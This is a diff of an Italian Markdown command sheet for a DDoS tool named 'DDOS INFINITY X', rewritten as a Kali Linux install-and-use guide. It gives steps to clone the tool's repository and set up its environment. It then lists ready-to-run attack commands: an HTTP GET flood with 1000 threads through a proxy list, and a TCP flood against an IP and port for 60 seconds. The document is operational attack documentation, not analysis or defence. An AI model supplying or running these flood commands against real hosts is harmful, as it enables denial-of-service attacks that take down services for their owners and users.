@@ -1,56 +1,32 @@
-# Comandi — DDOS INFINITY X
+# Kali Linux — comandi installazione
 
-Vedi anche: [COMMANDS.md](../COMMANDS.md) (inglese, completo)
-
-## Installazione
+## Copia tutto nel terminale
 
 ```bash
+cd ~
+rm -rf DDOS-INFINITY-X
 git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
 cd DDOS-INFINITY-X
-pip3 install -r requirements.txt
-```
-
-Kali:
-
-```bash
 python3 -m venv venv
 source venv/bin/activate
 pip3 install -r requirements.txt
-```
-
-## Comandi base
-
-```bash
 python3 start.py HELP
-python3 start.py tools
-python3 start.py STOP
-python3 start.py MENU
 ```
 
-## Layer 7
+## Nuovo terminale
 
 ```bash
-python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
+cd ~/DDOS-INFINITY-X
+source venv/bin/activate
+python3 start.py HELP
 ```
 
-```bash
-python3 start.py GET http://example.com 0 1000 http.txt 10 100
-```
-
-## Layer 4
+## Uso
 
 ```bash
-python3 start.py <method> <ip:port> <threads> <duration>
-```
-
-```bash
+python3 start.py GET http://site.com 0 1000 http.txt 10 100
 python3 start.py TCP 1.1.1.1:80 500 60
+python3 start.py tools
 ```
 
-## Layer 4 + proxy
-
-```bash
-python3 start.py TCP 1.1.1.1:80 500 60 5 http.txt
-```
-
-## Proxy: 0=ALL 1=HTTP 4=SOCKS4 5=SOCKS5 6=RANDOM
+Vedi [COMMANDS.md](../COMMANDS.md)
